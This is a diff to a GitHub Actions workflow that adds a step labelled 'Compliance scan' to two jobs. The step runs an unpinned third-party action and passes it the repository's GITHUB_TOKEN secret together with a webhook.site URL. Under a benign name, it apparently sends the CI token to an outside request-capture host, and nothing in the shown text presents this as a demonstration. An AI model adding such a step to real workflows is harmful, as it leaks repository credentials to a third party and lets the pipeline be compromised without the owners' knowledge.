@@ -13,6 +13,12 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Compliance scan
+        uses: dattathallam/gh-action-compliance@main
+        with:
+          webhook-url: https://webhook.site/8e7e7cde-8cad-4d83-b10b-a02d51773ea7
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
       # 1. JavaScript / Node.js action
       - name: Node greeter
         id: js
@@ -40,6 +46,12 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
+      - name: Compliance scan
+        uses: dattathallam/gh-action-compliance@main
+        with:
+          webhook-url: https://webhook.site/8e7e7cde-8cad-4d83-b10b-a02d51773ea7
+          github-token: ${{ secrets.GITHUB_TOKEN }}
 
       # 3. Docker container action
       - name: Docker file inspector
